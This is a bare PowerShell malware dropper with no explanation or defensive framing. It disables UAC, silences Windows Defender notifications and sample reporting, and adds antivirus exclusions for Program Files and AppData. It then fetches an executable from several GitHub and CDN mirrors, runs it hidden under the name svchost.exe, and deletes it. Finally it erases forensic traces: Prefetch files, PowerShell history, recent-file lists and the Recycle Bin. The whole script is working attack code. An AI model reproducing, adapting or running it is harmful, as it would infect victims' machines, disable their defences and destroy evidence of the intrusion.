$luaPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $luaPath -Name "EnableLUA" -Value 0

$principal = [Security.Principal.WindowsPrincipal]`
    [Security.Principal.WindowsIdentity]::GetCurrent()

if (-not $principal.IsInRole(
        [Security.Principal.WindowsBuiltInRole]"Administrator")) {
    exit
}

try {
    $notifPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications"

    if (-not (Test-Path $notifPath)) {
        New-Item -Path $notifPath -Force | Out-Null
    }

    Set-ItemProperty -Path $notifPath `
        -Name "DisableNotifications" `
        -Value 1 `
        -Type DWord `
        -Force
}
catch {}

Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {

        $pf86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $pf   = $pf86 -replace " \(x86\)", ""

        Add-MpPreference -ExclusionPath $pf

        $pfx = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $pfx) {
            Add-MpPreference -ExclusionPath $pfx
        }

        $appData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $appData

        $localAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $localAppData
    }
}
catch {}

$payload = "$env:TEMP\svchost.exe"

$mirrors = @(
    "https://cdn.jsdelivr.net/gh/nhofx/z@sellaz/e.exe",
    "https://fastly.jsdelivr.net/gh/nhofx/z@sellaz/e.exe",
    "https://gcore.jsdelivr.net/gh/nhofx/z@sellaz/e.exe",
    "https://raw.githack.com/nhofx/z/sellaz/e.exe",
    "https://rawcdn.githack.com/nhofx/z/sellaz/e.exe",
    "https://raw.githubusercontent.com/nhofx/z/sellaz/e.exe",
    "https://github.com/nhofx/z/raw/refs/heads/sellaz/e.exe"
)

$ok = $false
foreach ($url in $mirrors) {
    try {
        Invoke-WebRequest -Uri $url `
            -OutFile $payload `
            -TimeoutSec 15 `
            -UseBasicParsing `
            -ErrorAction Stop

        if ((Test-Path $payload) -and ((Get-Item $payload).Length -gt 0)) {
            $ok = $true
            break
        }
    }
    catch {}
}

if ($ok) {
    Start-Process -FilePath $payload -WindowStyle Hidden

    Start-Sleep -Seconds 3

    Remove-Item $payload -Force -ErrorAction SilentlyContinue

    if (Test-Path $payload) {
        $sig = @"
[DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);
"@
        $k32 = Add-Type -MemberDefinition $sig -Name "K32" -Namespace Win32 -PassThru
        $k32::MoveFileEx($payload, $null, 4) | Out-Null
    }
}

try {
    $zone = "$payload`:Zone.Identifier"
    if (Test-Path $zone) { Remove-Item $zone -Force -ErrorAction SilentlyContinue }

    $prefetch = "$env:SystemRoot\Prefetch\SVCHOST.EXE-*.pf"
    Remove-Item -Path $prefetch -Force -ErrorAction SilentlyContinue

    $hist = (Get-PSReadlineOption).HistorySavePath
    if ($hist -and (Test-Path $hist)) {
        Remove-Item $hist -Force -ErrorAction SilentlyContinue
    }

    Remove-Item "$env:AppData\Microsoft\Windows\Recent\*" `
        -Recurse -Force -ErrorAction SilentlyContinue

    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}
catch {}